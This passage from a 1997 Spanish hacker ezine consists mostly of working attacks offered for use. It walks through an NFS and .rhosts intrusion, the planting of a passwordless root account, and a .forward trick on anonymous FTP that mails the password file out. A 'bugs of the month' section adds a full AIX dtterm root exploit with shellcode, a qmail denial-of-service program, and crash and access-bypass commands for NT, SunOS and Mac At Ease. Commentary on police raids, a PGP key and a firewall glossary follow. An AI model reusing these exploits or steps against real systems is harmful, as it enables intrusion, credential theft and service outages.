de que export/foo es el home directory del usuario guest. Ya tenemos marcado
el camino de entrada.
Vamos a efectuar un mount del directorio inicial del user "guest". Puesto que
no tenemos cuenta en la maquina local y puesto que el root no puede modificar
ficheros en un sistema de ficheros NFS 'montados' lo que haremos es crear
una cuenta "guest" en nuestro fichero de claves local, como usuario guest
podemos poner una entrada .rhosts en el directorio export/foo y esto nos
permitira hacer un login como guest a victima.com .... sin password.

Basta de rollo, aqui van los comandos: :-)

 saq # mount victim.com:/export/foo /foo
 saq # cd /foo
 saq # ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
 saq # echo guest:x:10001:1:temporary breakin account:/: >> /etc/passwd
 saq # ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
 saq # su guest
 saq % echo saq.com >> guest/.rhosts
 saq % rlogin victima.com

          Welcome to victima.com!

 victima %

Facil จno?. Si en lugar de directorios iniciales victima.com exportase
ficheros del sistema con comandos como (say, /usr, /usr/local/bin) podriamos
reemplazar uno de esos comandos de usuario con un troyano que ejecutase un
comando de nuestra eleccion.
El siguiente usuario que ejecutase ese comando lo que haria en realidad es
ejecutar _nuestro_ programa.

En el caso de que victima.com tuviese un comodin "+" en su /etc/hosts.equiv
que en algunos casos es la configuracion por defecto cualquier usuario sin
cuenta de root con un nombre de login en el fichero de passwords en
victima.com podria hacer rlogin a victima.com ...sin password.
El siguiente paso seria hacer log en victima.com e intentar modificar el
fichero de passwords para obtener acceso de root.

saq % whoami
bin
saq % rsh victima.com csh -i
Warning: no access to tty; 
victima %  ls -ldg /etc
drwxr-sr-x  8 bin      staff        2048 Jul 24 18:02 /etc
victima %  cd /etc
victima %  mv passwd pw.old
victima %  (echo toor::0:1:instant root shell:/:/bin/sh; cat pw.old ) > passwd
victima % ^D
saq % rlogin victima.com -l toor

          Welcome to victima.com!

 victima #

NOTA:"rsh victim.com csh -i" se usa para entrar inicialmente en el sistema
por que no deja trazas en los ficheros de auditoria wtmp o utmp, convirtiendo
el rsh en "invisible" para el finger y el who.

จHemos acabado?. No, ni de buen trozo. SATAN aun puede buscar mas brechas
de seguridad, volvemos a examinar los resultados de finger y rusers y
vemos una cuenta "ftp" por lo que posiblemente se permita anonymous FTP.
Hay veces en que el FTP esta mal configurado y ofrece posibilidades a un
intruso, probemos a ver si victima.com guarda una copia completa de su fichero
de claves en ~ftp/etc en lugar de una "version reducida". Si se da el caso
de que podemos escribir en el directorio inicial de ftp podemos ejecutar
remotamente un comando que haga... no se.. que os parece que nos mande el
fichero de claves *por correo*. El mecanismo es simple, como el del programa
que envia el mensaje de "vacation" para contestar automaticamente a los
mensajes que llegan.

 saq % cat forward_loser_file
 "|/bin/mail pas@saq.com < /etc/passwd"

 saq % ftp victima.com
 Connected to victima.com
 220 victima FTP server ready.
 Name (victima.com:pas): ftp
 331 Guest login ok, send ident as password.
 Password:
 230 Guest login ok, access restrictions apply.
 ftp> ls -lga
 200 PORT command successful.
 150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
 total 5
 drwxr-xr-x  4 101      1             512 Jun 20  1991 .
 drwxr-xr-x  4 101      1             512 Jun 20  1991 ..
 drwxr-xr-x  2 0        1             512 Jun 20  1991 bin
 drwxr-xr-x  2 0        1             512 Jun 20  1991 etc
 drwxr-xr-x  3 101      1             512 Aug 22  1991 pub
 226 ASCII Transfer complete.
 242 bytes received in 0.066 seconds (3.6 Kbytes/s)
 ftp> put forward_loser_file .forward
 43 bytes sent in 0.0015 seconds (28 Kbytes/s)
 ftp> quit
 saq % echo test | mail ftp@victima.com

Ahora tomaros un JB mientras esperais tranquilamente a que os llegue el
fichero de claves.
Si el tema interesa en proximos numeros seguiremos hablando de SATAN,
rcpinfo, NIS y como no, el infame Sendmail, posiblemente el programa con
mas bugs de la historia con permiso del MierdaSoft Internet Explorer.





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 07. LOS BUGS DEL MES                                                      บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Siempre el mismo dilema, no se pueden poner bugs antiguos por que la gente
se queja y con razon pero tampoco se puede poner lo ultimo puesto que la
utilidad de un bug es inversamente proporcional al nง de gente que lo
conoce. Lo siento pero se que todo lo que publico aqui no me va a servir
de nada en el mismo instante que la revista vea la luz, no obstante este
mes tiro la casa por la ventana, puede que sea el "especialista" en bugs
de Saqueadores y sin embargo he dejado que otros escribiesen esta seccion
que a veces, francamente, ha sido demasiado anticuada.

SE ACABO, en este numero teneis bugs para todos los gustos desde NT 4.0
hasta AIX pasando por Mac y todos _fresquitos_. จComo de frescos? Ninguno
con mas de dos meses en el momento de escribir estas lineas (12-Jun-97)
algunos con menos de un mes de existencia incluso. CALIDAD de la buena.
Aprovechaos antes que los administradores despierten, aunque bien pensado
no hay prisa algunos siguen pensando que el Explorer es seguro :DD.


Para: Aix
Tema: Conseguir shell de root
Patch: Manual, no lo pongo por que soy asi de torero.
Credit: George Guninski

/* Para obtener un shell de root, testeado en Aix 4.2 con RS/6000*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char prog[100]="/usr/dt/bin/dtterm";
char prog2[30]="dtterm";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror("error allocating");exit(2);};
strcpy(c,name);
strcat(c,"=");
strcat(c,value);
putenv(c);
return c;
}

/*El programa*/
main(int argc,char **argv,char **env)
{
/*El codigo*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420, 0x0
};
/* El desensamblado
7c0802a6        mfspr   r0,LR
9421fbb0        stu     SP,-1104(SP) --get stack
90010458        st      r0,1112(SP)
3c60f019        cau     r3,r0,0xf019 --CTR
60632c48        lis     r3,r3,11336  --CTR
90610440        st      r3,1088(SP)
3c60d002        cau     r3,r0,0xd002 --TOC
60634c0c        lis     r3,r3,19468  --TOC
90610444        st      r3,1092(SP)
3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e        lis     r3,r3,26990
90610438        st      r3,1080(SP)
3c602f73        cau     r3,r0,0x2f73
60636801        lis     r3,r3,26625
3863ffff        addi    r3,r3,-1
9061043c        st      r3,1084(SP) --terminate with 0
30610438        lis     r3,SP,1080
7c842278        xor     r4,r4,r4    --argv=NULL
80410440        lwz     RTOC,1088(SP)
80010444        lwz     r0,1092(SP) --jump
7c0903a6        mtspr   CTR,r0
4e800420        bctr              --jump
*/

#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn;
int max;
int QUIET=0;
int dobuf=0;
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
int ch;
unsigned int reta; /* direccion de retorno */
int corr=1000;
char *args[4];
char *arg1="-ms";
char *newenv[8];
int startwith=0;

mn=200;
max=300;

if (argc>1)
        corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
{
        perror("Bad parameters");
        exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) & 0x0000ffff);
*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
0x0000ffff);

reta=startwith ? (unsigned) &buf[mn]+corr : (unsigned)&buf[0]+corr;

for(nop=0;nop<mn;nop++)
 buf[nop]=startwith ? reta : 0x4ffffb82;        /*NOP*/
strcpy((char*)&buf[nop],(char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
        || !(reta && 0xff000000))
{
perror("Return address has zero");exit(5);
}

while(i++<max)
 buf[i]=reta;
buf[i]=0;

for(i=0;i<max-1;i++)
 frame[i]=reta;
frame[i]=0;

if(QUIET) {puts((char*)&buf);fflush(stdout);exit(0);};

/* 4 vars debido a que la correcta debe alinearse con un limite de 4 bytes */
newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);


newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
newenv[5]=NULL;

args[0]=prog2;
args[1]=arg1;
args[2]=(char*)&frame[0]; /* Se establecen unos frame pointers */
puts("Start...");/*Vamos!*/
execve(prog,args,newenv);
perror("Error executing execve \n");

Descripcion y Notas:

En usr/dt/bin/dtterm y/o en libXt se puede provocar un overflow de buffer
que nos de acceso al shell de root, este bug ha funcionado en AIX 4.2
Para compilar el programa

Usa el IBM C compiler.
Compilar con: cc -g aixdtterm.c
En algun caso se puede necesitar un poco de fuerza bruta.
DISPLAY debe ser cualquiere valido.
     --------------------------------------------------------



Para: Windows NT
Tema: Violacion de DNS 
Patch: En el server de Msoft , en fase beta.

telnet <anycomputer> 19 | telnet <anycomputer> 53

Descripcion y Notas:

Este comando efectua una conexion Telnet con el puerto 19 que genera una
cadena de caracteres, el output es entonces redirigido a la conexion
Telnet del puerto 53 (DNS), se provoca asi un "flood" que causa una Violacion
de Acceso en el servicio DNS, o sea la maquina a partir de entonces deja
de prestar servicios de conversion DNS/IP. จOs suena lo de "Unable to
resolve host name.."
     --------------------------------------------------------



Para: Qmail
Tema: Denegacion de Servicio qmail-smtpd
Patch: Manual
Credits: Jedi/Sector One

/* Programa para tumbar a Q-mail */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>

void    fatal(char *fmt,...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    putc('\n', stderr);
    exit(1);
}

chat(FILE * fp, char *fmt,...)
{
    char    buf[BUFSIZ];
    va_list ap;

    fseek(fp, 0L, SEEK_SET);
    va_start(ap, fmt);
    vfprintf(fp, fmt, ap);
    va_end(ap);
    fputs("\r\n", fp);
    if (fflush(fp))
        fatal("connection lost");
    fseek(fp, 0L, SEEK_SET);
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    if (atoi(buf) / 100 != 2)
        fatal("%s", buf);
}

int     main(int argc, char **argv)
{
    struct sockaddr_in sin;
    struct hostent *hp;
    char    buf[BUFSIZ];
    int     sock;
    FILE   *fp;

    if (argc != 2)
        fatal("usage: %s host", argv[0]);
    if ((hp = gethostbyname(argv[1])) == 0)
        fatal("host %s not found", argv[1]);
    memset((char *) &sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    memcpy((char *) &sin.sin_addr, hp->h_addr, sizeof(sin.sin_addr));
    sin.sin_port = htons(25);
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        fatal("socket: %s", strerror(errno));
    if (connect(sock, (struct sockaddr *) & sin, sizeof(sin)) < 0)
        fatal("connect to %s: %s", argv[1], strerror(errno));
    if ((fp = fdopen(sock, "r+")) == 0)
        fatal("fdopen: %s", strerror(errno));
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    chat(fp, "mail from:<me@me>", fp);
    for (;;)
        chat(fp, "rcpt to:<me@%s>", argv[1]);
}


Descripcion y Notas:

Qmail-dos-2 hace que un sistema de correo qmail se quede sin espacio de
intercambio al enviarle una cantidad infinita de destinatarios de un
mensaje.
Uso: qmail-dos-2 <nombre de host completo> (sin <> por supuesto)
Por supuesto el autor no se hace responsable de nada, si no te lo crees
mira el 'disclaimer' al inicio de la revista.
      --------------------------------------------------------



Para: SunOS
Tema: Cuelgue
Patch: Manual

1) cat /dev/tcx0
2) ls /dev/tcx0/*
3) cat /dev/zero > cat /dev/keyboard

Descripcion y Notas:

Los dos primeros cuelgan una Sparc 5 o Sparc 20 bajo SunOS 4.1.4, no cae
la Sparc 10 y puede funcionar o no con otras versiones de SunOS.
El ultimo cuelga cualquier cosa entre Sparc1-Sparc10 si utiliza SunOS.
Por supuesto siempre y cuando el administrador no se haya molestado en
corregir ese defecto, recuerdo que no hay patch sino que tiene que ser
un trabajo "manual".
     ---------------------------------------------------------



Para: Mac/At Ease
Tema: Romper proteccion
Patch: ?

Ejecutar Netscape
file://muy%20secreto/Chanchullos/gordos.txt

Descripcion y Notas:
At Ease es un programa que permite introducir restricciones de acceso a
ficheros y directorios pero 'lastimosamente' esta proteccion se viene abajo
si se utiliza Netscape para acceder a dichos ficheros con la sintaxis arriba
descrita y donde %20 equivale a espacio.
Si el fichero no es de texto o representable por Netscape, ญno hay problema!,
podemos grabarlo en un directorio al que si tengamos acceso y una vez ahi
manipularlo a nuestro antojo.

Las posibilidades son inmensas, puesto que _cualquier archivo de la red_
protegido con At Ease esta a nuestro alcance, ญญsolo tenemos que mandarnoslo
por correo a nosotros mismos!! (usando el mailto de Netscape).
Por ejemplo จque me decis de coger el archivo de preferencias de At Ease que
contiene las claves del "master"?
     --------------------------------------------------------

Este mes no os quejeis de los bugs.



  
   
ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 08. COLABORACIONES Y PETICIONES                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Como os podeis imaginar el esfuerzo de hacer un numero en solitario es
agotador y ademas no se puede hablar de temas que uno no domina, asi que
ENVIAD VUESTROS ARTICULOS Y COLABORACIONES a -- paseante@geocities.com --
Con medio grupo en el talego o libertad vigilada no nos podemos permitir
ser muy exigentes en estos momentos, probad suerte.

Especial llamamiento a todos aquellos que ya han colaborado con Saqueadores,
seguid con vuestros articulos. ญญOs necesitamos a todos!!.

Al Duke y a los otros por supuesto no les acusan de editar Saqueadores,
faltaria mas, sino de "hacking", poseer programas "destinados a alterar o
suprimir la proteccion de otros.." y chorradas similares por las que podrian
meter a media Espaคa en la carcel, pero todos sabemos que es lo que les
molesta realmente y si no จporque no van a todos los sitios oficiales con
soft ilegal que denuncia Fer en su pagina? (http://www.arrakis.es/~espadas)
Al mismo tiempo que se detenia a los "piratas de verdad" (una red dedicada
a vender programas comerciales) se ha 'aprovechado' para silenciosamente ir
metiendo mano a gente que molestaba y crear la impresion de que todo estaba
relacionado, NADA DE ESO, con lo del pirateo se ha detenido y/o interrogado
a MAS DE 30 PERSONAS pero al tiempo se ha aprovechado para hacer una operacion
mucho mas sigilosa y de la que no se ha informado a la prensa ni se han hecho
fotos, se trata de la SUPRESION A CONCIENCIA de destacados representantes del
movimiento hacker en Espaคa y para distraer la atencion de los medios se hace
coincidir con una redada importante en numero para que asi "unos cuantos mas"
pasen desapercibidos. Estrategia basica.

A los pitufos o civiles que leen esto, ญid a detened a los de HB que celebran
fiestas cada vez que vuelan a uno de vuestros compaคeros!.
ญHaced redadas en el Egin que eso si es informacion terrorista!

Necesito gente que escriba sobre virus, crackings, telefonia con o sin hilos,
bueno que escriba sobre cualquier cosa que encaje en este fanzine o ezine,
creo que ha quedado claro จno?. Es mushho trabajo pa mi solito.

Si no teneis tiempo pero si dinero o medios necesitamos espacio FTP para
poner programas, dominio propio o mas de 10Mb para paginas Web tampoco nos
vendria mal.

Un 'artista' que quiera echar una mano currandose nuestro sitio Web tambien
seria bienvenido.

Ayudad a difundir la revista, subidla a BBS, poned links, pasadsela a amigos
ญyo que se! pero que se sepa que no han pillado a todos, al menos de momento
aunque me parece que oigo llamar a la puerta  :DD

Por supuesto los proyectos de lanzar una Edicion Internacional de Saqueadores
y de reeditar corregidos y ampliados los primeros numeros en un pack especial
quedan en suspenso hasta nuevo aviso. Pero si alguien estaba trabajando en
ello, ENVIALO, ya lo utilizare en su momento.


Os recomiendo que encripteis el correo dirigido a <paseante@geocities.com>
con esta clave.

Tipo Bits/Clave    Fecha      Identificador
pub  1024/AF12D401 1997/02/19 Paseante <paseante@geocities.com>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQCNAjMK8d4AAAEEAL4kqbSDJ8C60RvWH7MG/b27Xn06fgr1+ieeBHyWwIIQlGkI
ljyNvYzLToiS+7KqNMUMoASBRC80RSb8cwBJCa+d1yfRlkUMop2IaXoPRzXtn5xp
7aEfjV2PP95/A1612KyoTV4V2jpSeQZBUn3wryD1K20a5H+ngbPnIf+vEtQBAAUT
tCFQYXNlYW50ZSA8cGFzZWFudGVAZ2VvY2l0aWVzLmNvbT6JAJUDBRAzn9+Js+ch
/68S1AEBAZUfBACCM+X7hYGSoYeZVLallf5ZMXb4UST2R+a6qcp74/N8PI5H18RR
GS8N1hpYTWItB1Yt2NLlxih1RX9vGymZqj3TRAGQmojzLCSpdSlJBVV5v4eCTvU/
qX2bZIxsBVwxoQP3yzp0v5cuOhIoAzvTl1UM/sE46ej4da6uT1B2UQ7bOQ==
=ukog
-----END PGP PUBLIC KEY BLOCK-----






   

ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 09. GLOSARIO DE TERMINOS                                                  บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ




Soy consciente de que habr gente que se haya liado la cabeza con todo lo
anterior sobre proxys y firewalls y mi ensalada de "spanglish". :(

Voy a tratar de remediar la posible "empanada" con este glosario y pido
disculpas porque muchos de los terminos no tienen traducciขn al castellano y
he tenido que 'improvisar'.
En aras de la facilidad tambien he utilizado en el texto algunos conceptos
como sinขnimos sin que lo sean estrictamente, en cualquier caso espero que
me perdoneis.
Y no os preocupeis si veis aqui palabras que no salen en el articulo este
glosario esta pensado para cubrir los 3 articulos, recordais que he dicho
que seria como un cursillo sobre proxys y firewalls en 3 entregas. ;)

Unas cuantas palabrejas que conviene saber.



Autentificaciขn: El proceso de verificar la identidad del usuario que intenta
acceder a la red.

Authentication-Token: Un dispositivo portable que sirve para identificar a un
usuario, de tipo pregunta-respuesta, con secuencia de cขdigos de caracter
temporal o cualquier otra tecnica. Su rasgo caracteristico es la
impredecibilidad.

Autorizaciขn: Proceso de determinar el tipo de actividades permitidas, esta
estrechamente relacionado con la autentificaciขn puesto que diferentes
usuarios pueden tener diferentes permisos de actividad.

Bastion-Host: Sistema reforzado para resistir ataques e instalado en una red
bien como componente de un firewall o como servidor Web u otro tipo de
servidor que soporte acceso pฃblico. Normalmente operan con S.O estandar
(UNIX, VMS...) y no con firmware.

Checksum criptografico: La forma basica de detectar alteraciones de ficheros
en Unix, una funciขn one-way que produce una "huella dactilar" del fichero.

Chroot: Una tecnica UNIX en la que un proceso es permanentemente restringido
a una 'subarea' del sistema de ficheros. La tecnica que se aplica a cualquier
proxy diseคado segฃn las especificaciones de seguridad del Departamento de
Defensa de USA.

DNS Spoofing: Suplantar el nombre DNS de otro sistema.

Firewall: Sistema o combinaciขn de sistemas que refuerzan y vigilan el
perimetro entre dos o mas redes.

Firewall a nivel de aplicaciขn: Un sistema de firewall en el que los servicios
son manejados por procesos que mantienen conexiones TCP completas, a menudo
estos sistemas hacen un remapeado de IP para que todo el trafico interior
aparente proceder del firewall (id: screening)

Gateway: Ordenador o aplicaciขn que actua de "puente" entre dos sistemas.

Host-based security: Tecnica que protege un sistema individual de un ataque.
Esta tecnica depende del S.O.

Insider attack: Un ataque que se origina dentro de la red protegida.

IP spoofing: Tipo de ataque en el que un sistema asume la direcciขn IP de otro
para suplantarlo.

IP splicing/ Hijacking: Se produce cuando un atacante consigue interceptar una
sesiขn ya establecida. Por ejemplo: El atacante espera a que la victima se
dentifique ante el sistema y tras ello le suplanta como usuario autorizado.

Logging: El proceso de almacenar informaciขn sobre sucesos que ocurren en la
red o el firewall.

Network- Level Firewall: Un firewall en el que el trafico se examina a nivel
de protocolo.

Pregunta-Respuesta:  Forma de autentificaciขn en la cual el usuario recibe
algฃn tipo de pregunta impredecible que debe ser contestada por un
authentication-token. (Challenge and Response, literalmente desafio-respuesta)

Proxy: De Palma. Conocida y bella actriz espaคola

TCP/IP: Eso que sirve para vamos, ya me entiendes.



                         


ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 10. DESPEDIDA                                                             บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ



Hemos llegado al final de este numero, algo atipico pero espero haber
mantenido el nivel de la revista, de nuevo os pido COLABORAD para salvar
Saqueadores, puede que alguno de vosotros tengais miedo a las consecuencias,
tranquilos simplemente enviadme los ficheros, articulos, cartas de apoyo a
<paseante@geocities.com> y yo los pondre en la revista con vuestro apodo.
Los pitufos se quedaran con las ganas, ESTO NO ES ILEGAL.

Es duro ver como todo un proyecto, un grupo cae barrido por la intrasigencia
del poder, จque guardan en sus ordenadores que tanto miedo nos tienen?.
Anyway, show must go on!.


 



Y recordad, hagais lo que hagais.
Tened cuidado ahi fuera.

Paseante <paseante@geocities.com>

 ***************************************************************************
 * Esta revista se distribuye libremente, te autorizamos a que tu tambien  *
 * lo hagas siempre que no modifiques el ธ y el disclaimer,los miembros de * 
 * las fuerzas y cuerpos de seguridad del Estado deben pagar 950 pts para  *
 * poder leer la revista asi como todos los funcionarios del Ministerio y  *
 * las Consejerias de Interior, este pago se puede hacer cediendo a        *
 * Saqueadores espacio Web, FTP, o visitando nuestra homepage para darnos  *
 * Geopoints y siempre que las visitas sean validas segun las normas de    *
 * Geocities al respecto.                                                  *
 ***************************************************************************


ธ Saqueadores. 1996-7



   


